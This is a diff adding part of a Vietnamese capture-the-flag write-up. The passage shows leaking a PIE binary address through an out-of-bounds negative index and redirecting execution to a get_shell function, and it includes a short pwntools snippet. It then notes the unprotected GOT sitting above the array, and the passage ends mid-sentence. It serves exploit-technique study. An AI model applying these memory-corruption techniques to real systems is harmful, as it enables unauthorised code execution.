@@ -62,6 +62,39 @@ Rồi quay lại mục code C để đổi kiểu dữ liệu mảng acc thành 
 
 <img width="870" height="562" alt="image" src="https://github.com/user-attachments/assets/e2083d97-3e0b-416c-b7c7-8ce0df80a805" />
 
+<br><br>
+Nhìn lại chương trình thì ta có hàm `get_shell`. Vậy việc còn lại hiện tại chỉ là điều hướng chương trình đến `get_shell`.
+
+<img width="606" height="208" alt="image" src="https://github.com/user-attachments/assets/02873b01-7943-41e7-81e5-7b43685c60da" />
+
+PIE hiện đang bật nên cần leak địa chỉ binary trước.
+
+<img width="1012" height="602" alt="image" src="https://github.com/user-attachments/assets/e52f6902-d86d-471b-8f80-8e0fe572524f" />
+
+Bên trên `acc` thì có 1 địa chỉ của `__dso_handle` là con trỏ đến chính nó và cũng là địa chỉ binary.
+
+<img width="601" height="350" alt="image" src="https://github.com/user-attachments/assets/d0c689a5-90a7-481e-b97d-2f6fb05650d5" />
+
+Lúc này nếu chuyển luồng thực thi đến lệnh in thì sẽ leak được giá trị trong con trỏ.
+
+<img width="636" height="302" alt="image" src="https://github.com/user-attachments/assets/544abd6a-5b8a-4f5d-bd30-df95d9366691" />
+
+    input()
+    p.sendlineafter(b'> ',b'1')
+    p.sendlineafter(b'Index: ',b'-5')
+    p.sendlineafter(b'> ',b'4')
+    p.recvuntil(b'Name: ')
+    binary_leak=u64(p.recv(6)+b'\x00\x00')
+    exe.address=binary_leak-0x35b0
+
+<img width="982" height="518" alt="image" src="https://github.com/user-attachments/assets/f72c4e13-6b08-491d-a098-7c0c1cd94727" />
+
+Nhìn xa hơn về trước mảng acc thì còn lưu cả các hàm thư viện. Điều này là do cơ chế bảo mật RELRO đang ở trạng thái NO RELRO. Do đó bảng GOT không bị di dời và ở sát
+ngay trên 
+
+
+
+
 
 
 
